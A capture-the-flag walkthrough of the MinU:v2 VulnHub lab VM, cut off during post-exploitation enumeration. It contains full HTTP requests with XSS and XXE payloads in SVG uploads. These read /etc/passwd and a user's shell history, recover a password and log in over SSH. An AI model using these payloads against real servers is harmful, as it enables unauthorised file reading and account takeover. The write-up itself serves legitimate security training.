@@ -1,0 +1,1180 @@
+========================================================================================================================================
+Walkthrough of the MinU:v2 VulnHub VM CTF
+========================================================================================================================================
+
+Step 1. Scanning & Enumeration (Nmap + Nikto + Dirb)
+        1. Open ports: SSH/22 and HTTP/3306 (note: weird to see a website using the default MySQL database port)
+        2. Find the page "http://IP:3306/upload.html" that allows to upload pictures in ".SVG" format (XML file)
+
+Step 2. Gaining Access (Burp proxy)
+        1. Find out that the upload page is prone to an XML External Entity (XXE) vulnerability and to a reflected XSS vulnerability
+        2. Exploit the XXE vulnerability to read arbitrary files 
+        => we don't have ROOT privilege but we can read the files belonging to the linux account "employee" 
+        => the employee account doesn't have authorized SSH keys but its history file discloses a login and a password (superultrapass3)
+        3. Find out that the password is valid for the employee account and SSH to the Linux box as "employee"
+
+Step 3. Post-exploitation - Linux enumeration (scripts: "LinEnum.sh" & "Linux-exploit-suggester.sh")
+
+Step 4. Privilege escalation to ROOT
+        => The binary "/usr/bin/micro" is owned by ROOT and has the SUID permission bit
+        => It is a terminal-based text editor that allow to execute OS commands
+        => Run commands as ROOT (e.g. display the shadow file and the file "/root/flag.txt")
+
+
+========================================================================================================================================
+Step 1. Scanning & Enumeration 
+========================================================================================================================================
+
+kali@kali:~$ sudo netdiscover
+ Currently scanning: 192.168.49.0/16   |   Screen View: Unique Hosts                                                                                                                                     
+                                                                                                                                                                                                         
+ 8 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 498                                                                                                                                         
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.1.254   68:a3:78:8b:0c:dd      3     198  FREEBOX SAS                                                                                                                                           
+ 192.168.1.3     14:0c:76:53:4d:4e      1      60  FREEBOX SAS                                                                                                                                           
+ 192.168.1.29    f4:5c:89:c9:be:c5      1      60  Apple, Inc.                                                                                                                                           
+ 192.168.1.50    08:00:27:2f:c5:a5      1      60  PCS Systemtechnik GmbH                                                                                                                                
+ 192.168.1.33    28:3f:69:c8:fc:15      1      60  Sony Mobile Communications Inc                                                                                                                        
+ 192.168.27.1    14:0c:76:53:4d:4e      1      60  FREEBOX SAS
+
+
+-------------------------------------------------------------------------------------------------------------------
+
+
+kali@kali:~$ sudo nmap -sS -sV -sC -P0 -p 1-65535 192.168.1.50
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-20 00:14 CET Nmap scan report for 192.168.1.50
+Host is up (0.00058s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 82:33:25:61:27:97:ea:4a:49:f5:76:a3:33:1c:ae:2b (RSA)
+|   256 ed:ca:f6:b9:b5:39:32:89:d0:a3:36:94:82:04:4a:e8 (ECDSA)
+|_  256 26:79:15:2e:be:93:02:41:04:c9:ea:e8:05:16:d1:83 (ED25519)
+3306/tcp open  mysql?
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain
+|     Transfer-Encoding: chunked
+|     Request
+|   GetRequest, HTTP Options: 
+|     HTTP/1.0 404 Not Found
+|     X-Powered-By: Kemal
+|     Content-Type: text/html
+|     <!DOCTYPE html>
+|     <html>
+|     <head>
+|     <style type="text/css">
+|     body { text-align:center;font-family:helvetica,arial;font-size:22px;
+|     color:#888;margin:20px}
+|     max-width: 579px; width: 100%; }
+|     {margin:0 auto;width:500px;text-align:left}
+|     </style>
+|     </head>
+|     <body>
+|     <h2>Kemal doesn't know this way.</h2>
+|_    <svg id="svg" version="1.1" width="400" height="400" viewBox="0 0 400 400" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" ><g id="svgg"><path id="path0" d="M262.800 99.200 L 262.800 150.400 265.461 150.400 L 268.121 150.400 267.864 144.300 C 267.722 140.945,267.510 120.110,267.391 98.000 C 267.273 75.890,267.074 55.595,266.948 52.900 L 266.719 48.000 264.760 48.000 L 262.800 48.000 262.800 99.200 M160.800 290.800 C 160.800 291.301,161.224 291.301,162.000
+|_mysql-info: ERROR: Script execution failed (use -d to debug)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V=7.80%I=7%D=1/20%Time=600767FB%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,6D,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+SF:ext/plain\r\nTransfer-Encoding:\x20chunked\r\n\r\n10\r\n400\x20Bad\x20R
+SF:equest\n\r\n0\r\n\r\n")%r(GetRequest,642C,"HTTP/1\.0\x20404\x20Not\x20F
+SF:ound\r\nX-Powered-By:\x20Kemal\r\nContent-Type:\x20text/html\r\n\r\n\x2
+SF:0\x20<!DOCTYPE\x20html>\n\x20\x20<html>\n\x20\x20<head>\n\x20\x20\x20\x
+SF:20<style\x20type=\"text/css\">\n\x20\x20\x20\x20body\x20{\x20text-align
+SF::center;font-family:helvetica,arial;font-size:22px;\n\x20\x20\x20\x20\x
+SF:20\x20color:#888;margin:20px}\n\x20\x20\x20\x20img\x20{\x20max-width:\x
+SF:20579px;\x20width:\x20100%;\x20}\n\x20\x20\x20\x20#c\x20{margin:0\x20au
+SF:to;width:500px;text-align:left}\n\x20\x20\x20\x20</style>\n\x20\x20</he
+SF:ad>\n\x20\x20<body>\n\x20\x20\x20\x20<h2>Kemal\x20doesn't\x20know\x20th
+SF:is\x20way\.</h2>\n\x20\x20\x20\x20<svg\x20id=\"svg\"\x20version=\"1\.1\
+SF:"\x20width=\"400\"\x20height=\"400\"\x20viewBox=\"0\x200\x20400\x20400\
+SF:"\x20xmlns=\"http://www\.w3\.org/2000/svg\"\x20xmlns:xlink=\"http://www
+SF:\.w3\.org/1999/xlink\"\x20><g\x20id=\"svgg\"><path\x20id=\"path0\"\x20d
+SF:=\"M262\.800\x2099\.200\x20L\x20262\.800\x20150\.400\x20265\.461\x20150
+SF:\.400\x20L\x20268\.121\x20150\.400\x20267\.864\x20144\.300\x20C\x20267\
+SF:.722\x20140\.945,267\.510\x20120\.110,267\.391\x2098\.000\x20C\x20267\.
+SF:273\x2075\.890,267\.074\x2055\.595,266\.948\x2052\.900\x20L\x20266\.719
+SF:\x2048\.000\x20264\.760\x2048\.000\x20L\x20262\.800\x2048\.000\x20262\.
+SF:800\x2099\.200\x20M160\.800\x20290\.800\x20C\x20160\.800\x20291\.301,16
+SF:1\.224\x20291\.301,162\.000")%r(HTTPOptions,16E8,"HTTP/1\.0\x20404\x20N
+SF:ot\x20Found\r\nX-Powered-By:\x20Kemal\r\nContent-Type:\x20text/html\r\n
+SF:\r\n\x20\x20<!DOCTYPE\x20html>\n\x20\x20<html>\n\x20\x20<head>\n\x20\x2
+SF:0\x20\x20<style\x20type=\"text/css\">\n\x20\x20\x20\x20body\x20{\x20tex
+SF:t-align:center;font-family:helvetica,arial;font-size:22px;\n\x20\x20\x2
+SF:0\x20\x20\x20color:#888;margin:20px}\n\x20\x20\x20\x20img\x20{\x20max-w
+SF:idth:\x20579px;\x20width:\x20100%;\x20}\n\x20\x20\x20\x20#c\x20{margin:
+SF:0\x20auto;width:500px;text-align:left}\n\x20\x20\x20\x20</style>\n\x20\
+SF:x20</head>\n\x20\x20<body>\n\x20\x20\x20\x20<h2>Kemal\x20doesn't\x20kno
+SF:w\x20this\x20way\.</h2>\n\x20\x20\x20\x20<svg\x20id=\"svg\"\x20version=
+SF:\"1\.1\"\x20width=\"400\"\x20height=\"400\"\x20viewBox=\"0\x200\x20400\
+SF:x20400\"\x20xmlns=\"http://www\.w3\.org/2000/svg\"\x20xmlns:xlink=\"htt
+SF:p://www\.w3\.org/1999/xlink\"\x20><g\x20id=\"svgg\"><path\x20id=\"path0
+SF:\"\x20d=\"M262\.800\x2099\.200\x20L\x20262\.800\x20150\.400\x20265\.461
+SF:\x20150\.400\x20L\x20268\.121\x20150\.400\x20267\.864\x20144\.300\x20C\
+SF:x20267\.722\x20140\.945,267\.510\x20120\.110,267\.391\x2098\.000\x20C\x
+SF:20267\.273\x2075\.890,267\.074\x2055\.595,266\.948\x2052\.900\x20L\x202
+SF:66\.719\x2048\.000\x20264\.760\x2048\.000\x20L\x20262\.800\x2048\.000\x
+SF:20262\.800\x2099\.200\x20M160\.800\x20290\.800\x20C\x20160\.800\x20291\
+SF:.301,161\.224\x20291\.301,162\.000");
+MAC Address: 08:00:27:2F:C5:A5 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 126.18 seconds
+
+
+------------------------------------------------------------------------------------------------
+
+kali@kali:~$ nikto -h http://192.168.1.50:3306/ 
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.50
++ Target Hostname:    192.168.1.50
++ Target Port:        3306
++ Start Time:         2021-01-20 00:30:09 (GMT1)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ Retrieved x-powered-by header: Kemal
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
+<SNIP>
+
+
+------------------------------------------------------------------------------------------------
+
+kali@kali:~$ dirb http://192.168.1.50:3306/
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Jan 20 00:22:18 2021
+URL_BASE: http://192.168.1.50:3306/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.1.50:3306/ ----
+                                                                                                                                                                                                         
+-----------------
+END_TIME: Wed Jan 20 00:22:25 2021
+DOWNLOADED: 4612 - FOUND: 0
+
+
+------------------------------------------------------------------------------------------------
+
+=> We find nothing so let's try a bigger dictionary and more extension (PHP, HTML, TXT, XML)
+
+
+kali@kali:~$ dirb http://192.168.1.50:3306/ /usr/share/dirb/wordlists/big.txt -X .php,.html,.txt,.xml
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Jan 20 00:44:49 2021
+URL_BASE: http://192.168.1.50:3306/
+WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt
+EXTENSIONS_LIST: (.php,.html,.txt,.xml) | (.php)(.html)(.txt)(.xml) [NUM = 4]
+
+-----------------
+
+GENERATED WORDS: 20458                                                         
+
+---- Scanning URL: http://192.168.1.50:3306/ ----
+
++ http://192.168.1.50:3306/upload.html (CODE:200|SIZE:908)                     
+                                                                               
+-----------------
+END_TIME: Wed Jan 20 00:47:07 2021
+DOWNLOADED: 81832 - FOUND: 1
+
+
+=> We found an upload page !!
+
+
+========================================================================================================================================
+Step 2. Gaining access
+========================================================================================================================================
+
+=> The "upload.html" page found by DIRB allows to upload a picture in ".SVG" format (XML). 
+
+
+-------------------------------------------------------------
+1. Let's try to upload a simple SVG picture (with burp proxy)
+-------------------------------------------------------------
+
+POST /upload HTTP/1.1
+Host: 192.168.1.50:3306
+Content-Length: 446
+Cache-Control: max-age=0
+DNT: 1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
+Origin: http://192.168.1.50:3306
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8vGmJmbXK2xsDwCl
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.1.50:3306/upload.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,fr;q=0.8
+Connection: close
+
+------WebKitFormBoundary8vGmJmbXK2xsDwCl
+Content-Disposition: form-data; name="svg"; filename="Test.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="no"?>
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+</svg>
+------WebKitFormBoundary8vGmJmbXK2xsDwCl--
+
+
+---------------
+---------------
+
+HTTP/1.1 200 OK
+X-Powered-By: Kemal
+Content-Type: text/html
+Content-Length: 273
+
+<?xml version="1.0" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" baseProfile="full">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+</svg>
+
+Upload OK
+
+
+------------------------------------------------------------------
+2. Let's try to upload a malicious SVG picture containing an XSS 
+------------------------------------------------------------------
+
+POST /upload HTTP/1.1
+Host: 192.168.1.50:3306
+Content-Length: 556
+Cache-Control: max-age=0
+DNT: 1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
+Origin: http://192.168.1.50:3306
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8vGmJmbXK2xsDwCl
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.1.50:3306/upload.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,fr;q=0.8
+Connection: close
+
+------WebKitFormBoundary8vGmJmbXK2xsDwCl
+Content-Disposition: form-data; name="svg"; filename="Test.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="no"?>
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert('This application is vulnerable to XSS attacks!');
+   </script>
+</svg>
+------WebKitFormBoundary8vGmJmbXK2xsDwCl--
+
+
+---------------
+---------------
+
+HTTP/1.1 200 OK
+X-Powered-By: Kemal
+Content-Type: text/html
+Content-Length: 383
+
+<?xml version="1.0" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" baseProfile="full">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert('This application is vulnerable to XSS attacks!');
+   </script>
+</svg>
+Upload OK
+
+
+=> The reflected XSS attack is working.
+
+
+------------------------------------------------------------------------------------------------------
+3. Let's try to upload a malicious SVG picture containing an XXE attack payload (XML External Entity)
+------------------------------------------------------------------------------------------------------
+
+POST /upload HTTP/1.1
+Host: 192.168.1.50:3306
+Content-Length: 517
+Cache-Control: max-age=0
+DNT: 1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
+Origin: http://192.168.1.50:3306
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8vGmJmbXK2xsDwCl
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.1.50:3306/upload.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,fr;q=0.8
+Connection: close
+
+------WebKitFormBoundary8vGmJmbXK2xsDwCl
+Content-Disposition: form-data; name="svg"; filename="Test.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+</svg>
+------WebKitFormBoundary8vGmJmbXK2xsDwCl--
+
+---------------
+---------------
+
+HTTP/1.1 200 OK
+X-Powered-By: Kemal
+Content-Type: text/html
+Content-Length: 154
+
+image.svg:1: parser error : Extra content at the end of the document
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+^
+Upload OK
+
+
+=> It is not working..
+
+
+------------------------------------------------------------------ 
+4. Let's try again without the SVG picture (just the XXE payload)
+------------------------------------------------------------------ 
+
+POST /upload HTTP/1.1
+Host: 192.168.1.50:3306
+Content-Length: 321
+Cache-Control: max-age=0
+DNT: 1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
+Origin: http://192.168.1.50:3306
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8vGmJmbXK2xsDwCl
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.1.50:3306/upload.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,fr;q=0.8
+Connection: close
+
+------WebKitFormBoundary8vGmJmbXK2xsDwCl
+Content-Disposition: form-data; name="svg"; filename="Test.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="no"?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+
+------WebKitFormBoundary8vGmJmbXK2xsDwCl--
+
+---------------
+---------------
+
+HTTP/1.1 200 OK
+X-Powered-By: Kemal
+Content-Type: text/html
+Content-Length: 1482
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+postgres:x:70:70::/var/lib/postgresql:/bin/sh
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin
+employee:x:1000:1000:Linux User,,,:/home/employee:/bin/ash
+</foo>
+Upload OK
+
+=> The XXE attack is working :-) 
+
+
+----------------------------------------------------------------
+5. Let's check if we are ROOT...
+----------------------------------------------------------------
+
+POST /upload HTTP/1.1
+Host: 192.168.1.50:3306
+Content-Length: 321
+Cache-Control: max-age=0
+DNT: 1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
+Origin: http://192.168.1.50:3306
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8vGmJmbXK2xsDwCl
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.1.50:3306/upload.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,fr;q=0.8
+Connection: close
+
+------WebKitFormBoundary8vGmJmbXK2xsDwCl
+Content-Disposition: form-data; name="svg"; filename="Test.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="no"?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
+
+------WebKitFormBoundary8vGmJmbXK2xsDwCl--
+ 
+
+---------------
+---------------
+
+HTTP/1.1 200 OK
+X-Powered-By: Kemal
+Content-Type: text/html
+Content-Length: 506
+
+I/O error : Permission denied
+I/O error : Permission denied
+image.svg:1: parser error : Failure to process entity xxe
+E foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;
+                                                                                ^
+image.svg:1: parser error : Entity 'xxe' not defined
+E foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;
+                                                                                ^
+Upload OK
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+6. Let's see if we can display the ".ash_history" file of the account "employee"  (employee:x:1000:1000:Linux User,,,:/home/employee:/bin/ash)
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+Note: "/home/employee:/bin/ash"
+
+POST /upload HTTP/1.1
+Host: 192.168.1.50:3306
+Content-Length: 337
+Cache-Control: max-age=0
+DNT: 1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
+Origin: http://192.168.1.50:3306
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8vGmJmbXK2xsDwCl
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.1.50:3306/upload.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,fr;q=0.8
+Connection: close
+
+------WebKitFormBoundary8vGmJmbXK2xsDwCl
+Content-Disposition: form-data; name="svg"; filename="Test.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="no"?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///home/employee/.ash_history" >]><foo>&xxe;</foo>
+
+------WebKitFormBoundary8vGmJmbXK2xsDwCl--
+
+---------------
+---------------
+
+HTTP/1.1 200 OK
+X-Powered-By: Kemal
+Content-Type: text/html
+Content-Length: 208
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM "file:///home/employee/.ash_history">
+]>
+<foo>useradd -D bossdonttrackme -p superultrapass3
+
+
+exit
+</foo>
+Upload OK
+
+
+=> We found a username and a password but there is no Linux account name "bossdonttrackme".
+
+---------------------------------------------------------
+7. Let's see if we can display a private SSH key...
+---------------------------------------------------------
+
+POST /upload HTTP/1.1
+Host: 192.168.1.50:3306
+Content-Length: 345
+Cache-Control: max-age=0
+DNT: 1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
+Origin: http://192.168.1.50:3306
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8vGmJmbXK2xsDwCl
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.1.50:3306/upload.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,fr;q=0.8
+Connection: close
+
+------WebKitFormBoundary8vGmJmbXK2xsDwCl
+Content-Disposition: form-data; name="svg"; filename="Test.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="no"?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///home/employee/.ssh/authorized_keys" >]><foo>&xxe;</foo>
+
+------WebKitFormBoundary8vGmJmbXK2xsDwCl--
+
+---------------
+---------------
+
+HTTP/1.1 200 OK
+X-Powered-By: Kemal
+Content-Type: text/html
+Content-Length: 446
+
+image.svg:1: parser error : Failure to process entity xxe
+ ><!ENTITY xxe SYSTEM "file:///home/employee/.ssh/authorized_keys" >]><foo>&xxe;
+                                                                                ^
+image.svg:1: parser error : Entity 'xxe' not defined
+ ><!ENTITY xxe SYSTEM "file:///home/employee/.ssh/authorized_keys" >]><foo>&xxe;
+                                                                                ^
+Upload OK
+
+
+---------------------------------------------------------------------------------------------
+8. Let's try the password "superultrapass3" for the Linux account "employee".
+---------------------------------------------------------------------------------------------
+
+=> It is working :)
+
+kali@kali:~$ ssh employee@192.168.1.50
+
+The authenticity of host '192.168.1.50 (192.168.1.50)' can't be established.
+ECDSA key fingerprint is SHA256:yDEwMAaye9gQ8q+xTLQxriV2ww9YRUYoGqvsqtXbskI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.1.50' (ECDSA) to the list of known hosts.
+employee@192.168.1.50's password: 
+        _                   ____  
+  /\/\ (_)_ __  /\ /\__   _|___ \ 
+ /    \| | '_ \/ / \ \ \ / / __) |
+/ /\/\ \ | | | \ \_/ /\ V / / __/ 
+\/    \/_|_| |_|\___/  \_/ |_____|
+
+minuv2:~$ whoami
+employee
+
+minuv2:~$ sudo -l
+-ash: sudo: not found
+
+minuv2:~$ bash
+-ash: bash: not found
+
+minuv2:~$ pwd
+/home/employee
+
+minuv2:~$ 
+
+
+=======================================================================================================================================================
+Step 3. Post-exploitation - Linux enumeration (Linux exploit suggester, LinEnum)
+=======================================================================================================================================================
+
+------------------------------------------------------------------------------------------------
+1. Linux exploit suggester
+------------------------------------------------------------------------------------------------
+
+kali@kali:~$ curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh > Linux-exploiter-suggester.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 85113  100 85113    0     0   298k      0 --:--:-- --:--:-- --:--:--  297k
+
+kali@kali:~$ scp Linux-exploiter-suggester.sh employee@192.168.1.50:/home/employee/Linux-exploiter-suggester.sh
+employee@192.168.1.50's password: 
+Permission denied, please try again.
+employee@192.168.1.50's password: 
+
+Linux-exploiter-suggester.sh
+
+
+kali@kali:~$ ssh employee@192.168.1.50
+employee@192.168.1.50's password: 
+        _                   ____  
+  /\/\ (_)_ __  /\ /\__   _|___ \ 
+ /    \| | '_ \/ / \ \ \ / / __) |
+/ /\/\ \ | | | \ \_/ /\ V / / __/ 
+\/    \/_|_| |_|\___/  \_/ |_____|
+
+minuv2:~$ chmod +x Linux-exploiter-suggester.sh
+
+minuv2:~$ ./Linux-exploiter-suggester.sh 
+-ash: ./Linux-exploiter-suggester.sh: not found
+
+minuv2:~$ Linux-exploiter-suggester.sh 
+-ash: Linux-exploiter-suggester.sh: not found
+
+minuv2:~$ ash Linux-exploiter-suggester.sh 
+Linux-exploiter-suggester.sh: line 62: declare: not found
+Linux-exploiter-suggester.sh: line 63: declare: not found
+Linux-exploiter-suggester.sh: line 66: declare: not found
+Linux-exploiter-suggester.sh: line 67: declare: not found
+Linux-exploiter-suggester.sh: line 72: syntax error: unexpected "(" (expecting ")")
+
+
+=> It seems that there is an error with "ash". Let's try to run the script "LinEnum.sh" to see if we have the same problem...
+
+
+------------------------------------------------------------------------------------------------
+2. LinEnum
+------------------------------------------------------------------------------------------------
+
+kali@kali:~$ scp LinEnum.sh employee@192.168.1.50:/home/employee/LinEnum.sh
+
+employee@192.168.1.50's password: 
+LinEnum.sh          100%   46KB  17.2MB/s   00:00    
+
+kali@kali:~$ ssh employee@192.168.1.50
+employee@192.168.1.50's password: 
+        _                   ____  
+  /\/\ (_)_ __  /\ /\__   _|___ \ 
+ /    \| | '_ \/ / \ \ \ / / __) |
+/ /\/\ \ | | | \ \_/ /\ V / / __/ 
+\/    \/_|_| |_|\___/  \_/ |_____|
+
+minuv2:~$ ls
+LinEnum.sh   image.svg    main-static  main.pl      perl.out     public
+
+minuv2:~$ 
+
+minuv2:~$ chmod +x LinEnum.sh
+
+minuv2:~$ LinEnum.sh
+-ash: LinEnum.sh: not found
+
+minuv2:~$ ash LinEnum.sh
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+
+Scan started at:
+Wed Jan 20 00:36:50 UTC 2021
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux minuv2 4.19.58-0-virt #1-Alpine SMP Wed Jul 10 13:00:23 UTC 2019 x86_64 Linux
+
+
+[-] Kernel information (continued):
